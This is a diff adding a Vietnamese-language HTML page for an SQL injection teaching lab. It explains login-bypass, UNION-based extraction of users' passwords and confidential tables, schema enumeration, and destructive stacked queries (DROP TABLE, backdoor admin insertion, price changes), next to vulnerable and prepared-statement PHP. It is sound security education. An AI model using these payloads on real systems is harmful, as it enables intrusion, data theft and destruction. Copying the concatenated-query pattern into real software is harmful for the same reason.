@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection Demo - Lý Thuyết & Thực Hành</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
+                <i class="fas fa-shield-virus"></i>
+                <h1>SQL Injection Security Demo</h1>
+            </div>
+            <p class="subtitle">Tìm hiểu về SQL Injection và cách phòng chống</p>
+        </header>
+
+        <!-- Navigation -->
+        <nav class="nav">
+            <a href="#theory" class="nav-link active"><i class="fas fa-book"></i> Lý Thuyết</a>
+            <!-- <a href="#vulnerable" class="nav-link"><i class="fas fa-bug"></i> Demo Dễ Bị Tấn Công</a> -->
+            <a href="#union" class="nav-link"><i class="fas fa-link"></i> Union Attack</a>
+            <a href="#destructive" class="nav-link"><i class="fas fa-bomb"></i> Stacked Queries</a>
+            <a href="#secure" class="nav-link"><i class="fas fa-lock"></i> Demo Bảo Mật</a>
+        </nav>
+
+        <!-- Theory Section -->
+        <section id="theory" class="section active">
+            <h2><i class="fas fa-graduation-cap"></i> Lý Thuyết: SQL Injection</h2>
+            
+            <div class="card">
+                <h3><i class="fas fa-question-circle"></i> SQL Injection là gì?</h3>
+                <p>SQL Injection (SQLi) là một kỹ thuật tấn công bảo mật web, cho phép kẻ tấn công can thiệp vào các truy vấn SQL mà ứng dụng thực hiện tới cơ sở dữ liệu.</p>
+                <div class="highlight-box danger">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <strong>Nguy hiểm:</strong> SQLi có thể cho phép kẻ tấn công xem, thay đổi hoặc xóa dữ liệu không được phép truy cập.
+                </div>
+            </div>
+
+            <div class="card">
+                <h3><i class="fas fa-cogs"></i> Nguyên Lý Hoạt Động</h3>
+                <div class="code-example">
+                    <div class="code-header">❌ Mã nguồn dễ bị tấn công:</div>
+                    <pre><code>$username = $_POST['username'];
+$password = $_POST['password'];
+
+// Nối chuỗi trực tiếp - NGUY HIỂM!
+$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";</code></pre>
+                </div>
+
+                <div class="attack-example">
+                    <h4><i class="fas fa-user-secret"></i> Kịch bản tấn công:</h4>
+                    <p><strong>Kẻ tấn công nhập:</strong></p>
+                    <div class="code-example">
+                        <pre><code>Username: admin' OR '1'='1' --
+Password: bất kỳ</code></pre>
+                    </div>
+                    <p><strong>Câu lệnh SQL thực tế được tạo ra:</strong></p>
+                    <div class="code-example">
+                        <pre><code>SELECT * FROM users 
+WHERE username = 'admin' OR '1'='1' -- ' AND password = 'bất kỳ'</code></pre>
+                    </div>
+                    <div class="highlight-box warning">
+                        <i class="fas fa-info-circle"></i>
+                        <strong>Giải thích:</strong> Điều kiện <code>'1'='1'</code> luôn đúng, nên câu lệnh trả về tất cả user. Dấu <code>--</code> comment phần còn lại.
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3><i class="fas fa-bomb"></i> Rủi Ro Với Dữ Liệu Doanh Nghiệp</h3>
+                <div class="risk-grid">
+                    <div class="risk-item severe">
+                        <i class="fas fa-database"></i>
+                        <h4>Mất Dữ Liệu</h4>
+                        <p>Kẻ tấn công có thể xóa toàn bộ database bằng lệnh DROP TABLE</p>
+                    </div>
+                    <div class="risk-item high">
+                        <i class="fas fa-user-secret"></i>
+                        <h4>Đánh Cắp Thông Tin</h4>
+                        <p>Truy cập trái phép vào dữ liệu khách hàng, tài chính, bí mật kinh doanh</p>
+                    </div>
+                    <div class="risk-item high">
+                        <i class="fas fa-crown"></i>
+                        <h4>Leo Thang Đặc Quyền</h4>
+                        <p>Chiếm quyền admin, kiểm soát toàn bộ hệ thống</p>
+                    </div>
+                    <div class="risk-item medium">
+                        <i class="fas fa-edit"></i>
+                        <h4>Chỉnh Sửa Dữ Liệu</h4>
+                        <p>Thay đổi giá sản phẩm, số dư tài khoản, thông tin đơn hàng</p>
+                    </div>
+                    <div class="risk-item medium">
+                        <i class="fas fa-gavel"></i>
+                        <h4>Vi Phạm Pháp Luật</h4>
+                        <p>GDPR, HIPAA - phạt đến hàng triệu đô la</p>
+                    </div>
+                    <div class="risk-item low">
+                        <i class="fas fa-chart-line"></i>
+                        <h4>Mất Uy Tín</h4>
+                        <p>Khách hàng mất lòng tin, giảm doanh thu</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3><i class="fas fa-shield-alt"></i> Cách Phòng Chống</h3>
+                <div class="solution-grid">
+                    <div class="solution-item best">
+                        <i class="fas fa-star"></i>
+                        <h4>1. Prepared Statements (Khuyến Nghị)</h4>
+                        <div class="code-example">
+                            <pre><code>$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();</code></pre>
+                        </div>
+                    </div>
+                    <div class="solution-item good">
+                        <i class="fas fa-check"></i>
+                        <h4>2. Validation & Sanitization</h4>
+                        <p>Kiểm tra và làm sạch dữ liệu đầu vào</p>
+                    </div>
+                    <div class="solution-item good">
+                        <i class="fas fa-user-lock"></i>
+                        <h4>3. Phân Quyền Database</h4>
+                        <p>Giới hạn quyền truy cập của user database</p>
+                    </div>
+                    <div class="solution-item good">
+                        <i class="fas fa-eye"></i>
+                        <h4>4. Giấu Thông Báo Lỗi</h4>
+                        <p>Không hiển thị chi tiết lỗi SQL cho người dùng</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Vulnerable Demo Section -->
+        <!-- <section id="vulnerable" class="section">
+            <h2><i class="fas fa-bug"></i> Demo: Form Đăng Nhập Dễ Bị Tấn Công</h2>
+            
+            <div class="demo-container">
+                <div class="demo-left">
+                    <div class="card danger-card">
+                        <h3>⚠️ CẢNH BÁO: Không Bảo Mật</h3>
+                        <p>Form này sử dụng nối chuỗi trực tiếp - dễ bị SQL Injection</p>
+                        
+                        <form action="vulnerable_login.php" method="POST" class="login-form">
+                            <div class="form-group">
+                                <label><i class="fas fa-user"></i> Tên đăng nhập</label>
+                                <input type="text" name="username" placeholder="Nhập username" required>
+                            </div>
+                            <div class="form-group">
+                                <label><i class="fas fa-lock"></i> Mật khẩu</label>
+                                <input type="password" name="password" placeholder="Nhập password">
+                            </div>
+                            <button type="submit" class="btn btn-danger">
+                                <i class="fas fa-sign-in-alt"></i> Đăng Nhập (Không An Toàn)
+                            </button>
+                        </form>
+                        
+                        <div class="test-accounts">
+                            <h4>Tài khoản test hợp lệ:</h4>
+                            <ul>
+                                <li><strong>admin</strong> / 123456</li>
+                                <li><strong>john_doe</strong> / 123456</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="demo-right">
+                    <div class="card attack-guide">
+                        <h3><i class="fas fa-user-ninja"></i> Hướng Dẫn Tấn Công</h3>
+                        
+                        <div class="attack-method">
+                            <h4>💣 Phương pháp 1: Bypass Login</h4>
+                            <div class="code-example">
+                                <pre><code>Username: admin' OR '1'='1' --
+Password: (để trống hoặc bất kỳ)</code></pre>
+                            </div>
+                            <p class="attack-explain">Bỏ qua kiểm tra mật khẩu, đăng nhập thành công</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>💣 Phương pháp 2: Đăng nhập với bất kỳ user nào</h4>
+                            <div class="code-example">
+                                <pre><code>Username: john_doe' --
+Password: (bất kỳ)</code></pre>
+                            </div>
+                            <p class="attack-explain">Đăng nhập vào tài khoản john_doe mà không cần biết mật khẩu</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>💣 Phương pháp 3: Union Attack (Xem dữ liệu khác)</h4>
+                            <div class="code-example">
+                                <pre><code>Username: admin' UNION SELECT 1,document_name,content,4,5,6,7 FROM sensitive_data --
+Password: (bất kỳ)</code></pre>
+                            </div>
+                            <p class="attack-explain">Lấy dữ liệu từ bảng nhạy cảm khác</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>💣 Phương pháp 4: Lấy tất cả user</h4>
+                            <div class="code-example">
+                                <pre><code>Username: ' OR 1=1 --
+Password: (bất kỳ)</code></pre>
+                            </div>
+                            <p class="attack-explain">Lấy thông tin tất cả người dùng trong database</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section> -->
+
+        <!-- Union Attack Section -->
+        <section id="union" class="section">
+            <h2><i class="fas fa-link"></i> Demo: Union-Based SQL Injection</h2>
+            
+            <div class="card">
+                <h3><i class="fas fa-question-circle"></i> Union Attack là gì?</h3>
+                <p>Union-based SQLi cho phép kẻ tấn công kết hợp kết quả từ nhiều câu SELECT để lấy dữ liệu từ các bảng khác trong database.</p>
+                
+                <div class="highlight-box warning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <div>
+                        <strong>Nguyên lý:</strong> Sử dụng toán tử UNION để nối 2 câu SELECT với cùng số cột.
+                        <div class="code-example" style="margin-top: 10px;">
+                            <pre><code>SELECT name, price FROM products WHERE id = 1
+UNION
+SELECT username, password FROM users</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="demo-container">
+                <div class="demo-left">
+                    <div class="card danger-card">
+                        <h3>🛒 Tìm Kiếm Sản Phẩm</h3>
+                        <p>Nhập ID sản phẩm để tìm kiếm:</p>
+                        
+                        <form action="union_attack.php" method="GET" class="login-form">
+                            <div class="form-group">
+                                <label><i class="fas fa-search"></i> Product ID</label>
+                                <input type="text" name="id" placeholder="Nhập ID (1-5)" value="1">
+                            </div>
+                            <button type="submit" class="btn btn-danger">
+                                <i class="fas fa-search"></i> Tìm Kiếm
+                            </button>
+                        </form>
+                        
+                        <div class="test-accounts">
+                            <h4>IDs hợp lệ:</h4>
+                            <ul>
+                                <li><strong>1</strong> - iPhone 15 Pro</li>
+                                <li><strong>2</strong> - Samsung Galaxy S24</li>
+                                <li><strong>3</strong> - MacBook Pro M3</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="demo-right">
+                    <div class="card attack-guide">
+                        <h3><i class="fas fa-user-ninja"></i> Hướng Dẫn Union Attack</h3>
+                        
+                        <div class="attack-method">
+                            <h4>📋 Bước 1: Xác định số cột</h4>
+                            <div class="code-example">
+                                <pre><code>1 ORDER BY 1 --
+1 ORDER BY 2 --
+1 ORDER BY 3 -- (nếu lỗi = chỉ có 2 cột)
+1 ORDER BY 4 -- (nếu lỗi = chỉ có 3 cột)</code></pre>
+                            </div>
+                            <p class="attack-explain">Tìm số cột trong bảng products</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>🔍 Bước 2: Test UNION</h4>
+                            <div class="code-example">
+                                <pre><code>1 UNION SELECT NULL, NULL, NULL --</code></pre>
+                            </div>
+                            <p class="attack-explain">Kiểm tra UNION có hoạt động không</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>💣 Bước 3: Lấy dữ liệu từ bảng users</h4>
+                            <div class="code-example">
+                                <pre><code>1 UNION SELECT username, password_plain, role FROM users --</code></pre>
+                            </div>
+                            <p class="attack-explain">Lấy username, password, role của tất cả users!</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>💣 Bước 4: Lấy dữ liệu nhạy cảm</h4>
+                            <div class="code-example">
+                                <pre><code>1 UNION SELECT document_name, content, classification FROM sensitive_data --</code></pre>
+                            </div>
+                            <p class="attack-explain">Truy cập tài liệu mật của doanh nghiệp!</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>🗄️ Bước 5: Liệt kê tất cả bảng</h4>
+                            <div class="code-example">
+                                <pre><code>1 UNION SELECT table_name, table_schema, NULL FROM information_schema.tables WHERE table_schema='sqli_demo' --</code></pre>
+                            </div>
+                            <p class="attack-explain">Xem tất cả bảng trong database</p>
+                        </div>
+
+                        <div style="margin-top: 30px; padding: 20px; background: rgba(99, 102, 241, 0.1); border-left: 4px solid var(--primary); border-radius: 8px;">
+                            <h4 style="color: var(--primary); margin-bottom: 10px;">
+                                <i class="fas fa-graduation-cap"></i> Hướng dẫn chi tiết
+                            </h4>
+                            <p>Muốn biết cách thêm payload vào URL?</p>
+                            <a href="union_guide.php" class="btn btn-success" style="margin-top: 10px; display: inline-flex;">
+                                <i class="fas fa-book-open"></i> Xem hướng dẫn từng bước
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Stacked Queries / Destructive Attack Section -->
+        <section id="destructive" class="section">
+            <h2><i class="fas fa-bomb"></i> Demo: Stacked Queries - Tấn Công Phá Hoại</h2>
+            
+            <div class="card">
+                <h3><i class="fas fa-question-circle"></i> Stacked Queries là gì?</h3>
+                <p>Stacked Queries (Multiple Statements) cho phép thực thi nhiều câu lệnh SQL cùng lúc bằng cách ngăn cách bởi dấu chấm phẩy <code>;</code></p>
+                
+                <div class="highlight-box danger">
+                    <i class="fas fa-skull-crossbones"></i>
+                    <div>
+                        <strong>CỰC KỲ NGUY HIỂM:</strong> Kẻ tấn công có thể:
+                        <ul style="margin-top: 10px;">
+                            <li>🔥 <strong>DROP TABLE</strong> - Xóa toàn bộ bảng dữ liệu</li>
+                            <li>🔥 <strong>DELETE</strong> - Xóa tất cả dữ liệu</li>
+                            <li>🔥 <strong>INSERT</strong> - Chèn dữ liệu giả mạo</li>
+                            <li>🔥 <strong>UPDATE</strong> - Thay đổi giá, số dư, quyền admin</li>
+                            <li>🔥 <strong>CREATE USER</strong> - Tạo tài khoản backdoor</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="code-example">
+                    <div class="code-header">Ví dụ tấn công phá hoại:</div>
+                    <pre><code>SELECT * FROM products WHERE name = '';
+DROP TABLE users;
+--'</code></pre>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3><i class="fas fa-shield-alt"></i> Lưu Ý Về Demo</h3>
+                <div class="highlight-box info">
+                    <i class="fas fa-info-circle"></i>
+                    <div>
+                        <strong>MySQL với mysqli KHÔNG hỗ trợ stacked queries!</strong>
+                        <p style="margin-top: 10px;">Tuy nhiên, các hệ thống sau VẪN dễ bị tấn công:</p>
+                        <ul style="margin-top: 10px;">
+                            <li>✅ Microsoft SQL Server</li>
+                            <li>✅ PostgreSQL</li>
+                            <li>✅ PHP với PDO (nếu cấu hình sai)</li>
+                            <li>✅ Oracle Database</li>
+                        </ul>
+                        <p style="margin-top: 10px;">Demo này mô phỏng cách tấn công hoạt động trên các hệ thống đó.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="demo-container">
+                <div class="demo-left">
+                    <div class="card danger-card">
+                        <h3>🔍 Tìm Kiếm Sản Phẩm Theo Tên</h3>
+                        <p>Nhập tên sản phẩm để tìm kiếm:</p>
+                        
+                        <form action="stacked_queries.php" method="GET" class="login-form">
+                            <div class="form-group">
+                                <label><i class="fas fa-search"></i> Tên sản phẩm</label>
+                                <input type="text" name="search" placeholder="Nhập tên sản phẩm">
+                            </div>
+                            <button type="submit" class="btn btn-danger">
+                                <i class="fas fa-search"></i> Tìm Kiếm
+                            </button>
+                        </form>
+                        
+                        <div class="test-accounts">
+                            <h4>Tên hợp lệ:</h4>
+                            <ul>
+                                <li><strong>iPhone</strong></li>
+                                <li><strong>Samsung</strong></li>
+                                <li><strong>MacBook</strong></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="demo-right">
+                    <div class="card attack-guide">
+                        <h3><i class="fas fa-user-ninja"></i> Các Kiểu Tấn Công Phá Hoại</h3>
+                        
+                        <div class="attack-method">
+                            <h4>💣 1. XÓA TOÀN BỘ BẢNG (DROP TABLE)</h4>
+                            <div class="code-example">
+                                <pre><code>'; DROP TABLE users; --</code></pre>
+                            </div>
+                            <p class="attack-explain" style="color: #ef4444;">MẤT TẤT CẢ DỮ LIỆU USERS!</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>💣 2. XÓA TẤT CẢ DỮ LIỆU</h4>
+                            <div class="code-example">
+                                <pre><code>'; DELETE FROM products; --</code></pre>
+                            </div>
+                            <p class="attack-explain" style="color: #ef4444;">Xóa sạch tất cả sản phẩm!</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>💣 3. THAY ĐỔI GIÁ SẢN PHẨM</h4>
+                            <div class="code-example">
+                                <pre><code>'; UPDATE products SET price = 1 WHERE id > 0; --</code></pre>
+                            </div>
+                            <p class="attack-explain" style="color: #f59e0b;">Tất cả sản phẩm giá 1 đồng!</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>💣 4. LEO THANG QUYỀN (PRIVILEGE ESCALATION)</h4>
+                            <div class="code-example">
+                                <pre><code>'; UPDATE users SET role = 'admin' WHERE username = 'hacker'; --</code></pre>
+                            </div>
+                            <p class="attack-explain" style="color: #f59e0b;">Biến user thường thành admin!</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>💣 5. CHÈN DỮ LIỆU GIẢ MẠO</h4>
+                            <div class="code-example">
+                                <pre><code>'; INSERT INTO users (username, password_plain, role) VALUES ('backdoor', '123', 'admin'); --</code></pre>
+                            </div>
+                            <p class="attack-explain" style="color: #f59e0b;">Tạo tài khoản admin backdoor!</p>
+                        </div>
+
+                        <div class="attack-method">
+                            <h4>💣 6. TẠO BẢNG ĐỂ ĐÁNH CẮP DỮ LIỆU</h4>
+                            <div class="code-example">
+                                <pre><code>'; CREATE TABLE stolen_data AS SELECT * FROM users; --</code></pre>
+                            </div>
+                            <p class="attack-explain" style="color: #f59e0b;">Sao lưu dữ liệu để lấy sau!</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3><i class="fas fa-chart-line"></i> Thống Kê Thiệt Hại Thực Tế</h3>
+                <div class="risk-grid">
+                    <div class="risk-item severe">
+                        <i class="fas fa-dollar-sign"></i>
+                        <h4>Sony Pictures (2011)</h4>
+                        <p>77 triệu tài khoản bị đánh cắp. Thiệt hại: 171 triệu USD</p>
+                    </div>
+                    <div class="risk-item severe">
+                        <i class="fas fa-credit-card"></i>
+                        <h4>Heartland Payment (2008)</h4>
+                        <p>130 triệu thẻ tín dụng bị lộ qua SQL Injection</p>
+                    </div>
+                    <div class="risk-item high">
+                        <i class="fas fa-plane"></i>
+                        <h4>RockYou (2009)</h4>
+                        <p>32 triệu password plaintext bị đánh cắp</p>
+                    </div>
+                    <div class="risk-item high">
+                        <i class="fas fa-shopping-cart"></i>
+                        <h4>7-Eleven (2008)</h4>
+                        <p>Hệ thống thanh toán bị xâm nhập, mất hàng triệu USD</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Secure Demo Section -->
+        <section id="secure" class="section">
+            <h2><i class="fas fa-lock"></i> Demo: Form Đăng Nhập Bảo Mật</h2>
+            
+            <div class="demo-container">
+                <div class="demo-left">
+                    <div class="card success-card">
+                        <h3>✅ BẢO MẬT: Sử Dụng Prepared Statements</h3>
+                        <p>Form này an toàn trước SQL Injection</p>
+                        
+                        <form action="secure_login.php" method="POST" class="login-form">
+                            <div class="form-group">
+                                <label><i class="fas fa-user"></i> Tên đăng nhập</label>
+                                <input type="text" name="username" placeholder="Nhập username" required>
+                            </div>
+                            <div class="form-group">
+                                <label><i class="fas fa-lock"></i> Mật khẩu</label>
+                                <input type="password" name="password" placeholder="Nhập password" required>
+                            </div>
+                            <button type="submit" class="btn btn-success">
+                                <i class="fas fa-shield-alt"></i> Đăng Nhập An Toàn
+                            </button>
+                        </form>
+                        
+                        <div class="test-accounts">
+                            <h4>Tài khoản test hợp lệ:</h4>
+                            <ul>
+                                <li><strong>admin</strong> / 123456</li>
+                                <li><strong>john_doe</strong> / 123456</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="demo-right">
+                    <div class="card security-features">
+                        <h3><i class="fas fa-shield-alt"></i> Các Biện Pháp Bảo Mật</h3>
+                        
+                        <div class="security-item">
+                            <i class="fas fa-check-circle"></i>
+                            <div>
+                                <h4>Prepared Statements</h4>
+                                <div class="code-example">
+                                    <pre><code>$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->bind_param("s", $username);</code></pre>
+                                </div>
+                                <p>Tham số được tách biệt khỏi câu lệnh SQL</p>
+                            </div>
+                        </div>
+
+                        <div class="security-item">
+                            <i class="fas fa-check-circle"></i>
+                            <div>
+                                <h4>Password Hashing</h4>
+                                <div class="code-example">
+                                    <pre><code>password_verify($password, $hashed_password)</code></pre>
+                                </div>
+                                <p>Mật khẩu được mã hóa bằng bcrypt</p>
+                            </div>
+                        </div>
+
+                        <div class="security-item">
+                            <i class="fas fa-check-circle"></i>
+                            <div>
+                                <h4>Input Validation</h4>
+                                <p>Kiểm tra độ dài, ký tự đặc biệt</p>
+                            </div>
+                        </div>
+
+                        <div class="security-item">
+                            <i class="fas fa-check-circle"></i>
+                            <div>
+                                <h4>Error Handling</h4>
+                                <p>Không hiển thị chi tiết lỗi SQL</p>
+                            </div>
+                        </div>
+
+                        <div class="test-box">
+                            <h4>🧪 Thử tấn công form này:</h4>
+                            <p>Hãy thử các payload SQLi ở tab trước xem sao!</p>
+                            <ul>
+                                <li>admin' OR '1'='1' --</li>
+                                <li>' OR 1=1 --</li>
+                                <li>admin' UNION SELECT...</li>
+                            </ul>
+                            <p><strong>Kết quả:</strong> Tất cả đều thất bại! 🛡️</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p><i class="fas fa-graduation-cap"></i> Demo mục đích giáo dục - Học cách bảo vệ ứng dụng web của bạn!</p>
+            <p>⚠️ <strong>Cảnh báo:</strong> Chỉ thử nghiệm trên môi trường riêng. Tấn công hệ thống thực là bất hợp pháp!</p>
+        </footer>
+    </div>
+
+    <script>
+        // Navigation
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Remove active class from all links and sections
+                document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+                document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+                
+                // Add active class to clicked link
+                this.classList.add('active');
+                
+                // Show corresponding section
+                const targetId = this.getAttribute('href').substring(1);
+                document.getElementById(targetId).classList.add('active');
+                
+                // Smooth scroll
+                document.getElementById(targetId).scrollIntoView({ behavior: 'smooth' });
+            });
+        });
+
+        // Add animation on scroll
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, observerOptions);
+
+        document.querySelectorAll('.card').forEach(card => {
+            card.style.opacity = '0';
+            card.style.transform = 'translateY(20px)';
+            card.style.transition = 'opacity 0.5s, transform 0.5s';
+            observer.observe(card);
+        });
+    </script>
+</body>
+</html>
